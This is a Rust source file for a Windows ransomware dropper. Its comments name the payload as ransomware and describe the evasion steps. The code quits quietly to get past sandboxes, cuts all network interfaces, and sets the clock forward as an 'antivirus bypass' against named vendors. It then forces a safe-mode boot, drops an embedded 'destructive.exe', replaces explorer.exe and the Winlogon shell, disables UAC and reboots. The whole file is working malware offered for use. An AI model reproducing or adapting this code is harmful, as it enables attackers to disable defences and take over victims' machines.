use std::process::{Command, Stdio, exit};
use std::path::{Path};
use std::fs::{File};
use std::io::{self, Write};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE};
use winreg::RegKey;
use std::fs;
use std::env;

fn disable_uac() -> io::Result<()> {
    // Open the registry key for User Account Control
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let uac_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
        KEY_SET_VALUE
    )?;

    // Set EnableLUA to 0 to disable UAC
    uac_key.set_value("EnableLUA", &0u32)?;

    println!("UAC has been disabled (EnableLUA set to 0).");

    Ok(())
}

fn enable_safe_mode() -> io::Result<()> {
    // Set the system to boot in Safe Mode
    Command::new("bcdedit.exe")
        .arg("/set")
        .arg("{current}")
        .arg("safeboot")
        .arg("minimal")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn disable_network_interfaces() -> Result<(), std::io::Error> {
    // Disable all interfaces
    let output = Command::new("netsh")
        .arg("interface")
        .arg("show")
        .arg("interface")
        .output()?;

    let interfaces = String::from_utf8_lossy(&output.stdout);

    // Loop through interfaces and disable them
    for line in interfaces.lines() {
        if line.contains("Enabled") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(interface_name) = parts.get(3) {
                println!("Disabling interface: {}", interface_name);
                let _ = Command::new("netsh")
                    .arg("interface")
                    .arg("set")
                    .arg("interface")
                    .arg(interface_name)
                    .arg("disable")
                    .output();
            }
        }
    }

    Ok(())
}

fn change_system_date() -> Result<(), String> {
    // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
    let date_command = "date 12-19-2037";

    // Run date command
    let date_output = Command::new("cmd")
        .arg("/C")
        .arg(date_command)
        .stderr(Stdio::inherit())  // Pass error output to console
        .output()
        .map_err(|e| e.to_string())?;

    if !date_output.status.success() {
        return Err(format!("Failed to change date: {}", String::from_utf8_lossy(&date_output.stderr)));
    }

    println!("System date changed to 01-19-2037.");
    Ok(())
}

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn extract_embedded_exe() -> io::Result<()> {
    // Retrieve the Program Files directory dynamically
    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());

    // Create a long-lived value for the target directory path
    let target_dir_str = format!("{}/utkudrk2", program_files);
    let target_dir = Path::new(&target_dir_str);
    
    // Ensure the target directory exists
    if !target_dir.exists() {
        fs::create_dir_all(target_dir)?;
        println!("Created directory: {}", target_dir.display());
    }

    // Write the embedded executable to a file
    let exe_path = target_dir.join("destructive.exe");
    let mut exe_file = File::create(&exe_path)?;
    exe_file.write_all(include_bytes!("../resources/destructive.exe"))?;
    println!("Executable saved to {}.", exe_path.display());

    Ok(())
}

fn extract_explorer_exe() -> io::Result<()> {
    // Retrieve the system drive (typically C:)
    let system_drive = env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());

    // Create a long-lived value for the target path
    let target_path_str = format!("{}\\explorer.exe", system_drive);
    let target_path = Path::new(&target_path_str);

    // Create (or overwrite) the file at the target path
    let mut file = File::create(&target_path)?;

    // Write the embedded executable data to the file
    file.write_all(include_bytes!("../resources/explorer.exe"))?;
    println!("Explorer executable saved to {}.", target_path.display());

    Ok(())
}

fn reboot_system() -> io::Result<()> {
    // Shutdown and reboot the system to Safe Mode
    Command::new("shutdown.exe")
        .arg("-r")
        .arg("-t")
        .arg("7")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn create_directory() -> io::Result<()> {
    // Retrieve the Program Files directory dynamically
    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());

    // Create a long-lived value for the directory path
    let dir_path_str = format!("{}/utkudrk2", program_files);
    let dir_path = Path::new(&dir_path_str);

    // Step 2: Ensure the directory exists
    match fs::create_dir_all(dir_path) {
        Ok(_) => {
            println!("Directory successfully created at: {}", dir_path.display());
            Ok(())
        }
        Err(e) => {
            eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
            Err(e) // Return the error to the caller
        }
    }
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon with write access
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_WRITE,
    )?;

    // Set the new "Shell" value
    let new_shell_value = r"%SystemDrive%\explorer.exe";  
    winlogon_key.set_value("Shell", &new_shell_value)?;

    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);

    Ok(())
}

fn main() {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        exit(0); // Exit the program with a success status
    }

    println!("Admin privileges confirmed.");

    // Calling the create_directory function and checking for errors
    if let Err(e) = create_directory() {
        // Handle the error if the directory creation fails
        eprintln!("Error creating directory: {}", e);
        exit(0); // Exit the program with an success code to bypass malware analysis
    } else {
        // Directory creation was successful
        println!("Directory was created without any issues.");
    }

    // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
    // Cut network first to avoid auto update
    if let Err(e) = disable_network_interfaces() {
        eprintln!("Error disabling network interfaces: {}", e);
    }

    // Then update system date
    if let Err(e) = change_system_date() {
        eprintln!("Error changing system date: {}", e);
    }

    // Step 4: Enable safe mode
    if let Err(e) = enable_safe_mode() {
        eprintln!("Error enabling safe mode: {}", e);
    }

    // Step 5: Extract ransomware payload
    if let Err(e) = extract_embedded_exe() {
        eprintln!("Error extracting embedded ransomware executable: {}", e);
    }
        
    // Step 6: Extract safe boot payload
    if let Err(e) = extract_explorer_exe() {
        eprintln!("Error extracting embedded safe boot executable: {}", e);
    }
    
    // Step 7: Reboot the system to Safe Mode if needed
    if let Err(e) = reboot_system() {
        eprintln!("Error rebooting system: {}", e);
    }

    // Step 8: Disable UAC
    if let Err(e) = disable_uac() {
        eprintln!("Error disabling UAC: {}", e);
    }

    // Step 9: Modify Registry
    if let Err(e) = modify_registry() {
        eprintln!("Error modifying registry: {}", e);
    }

}
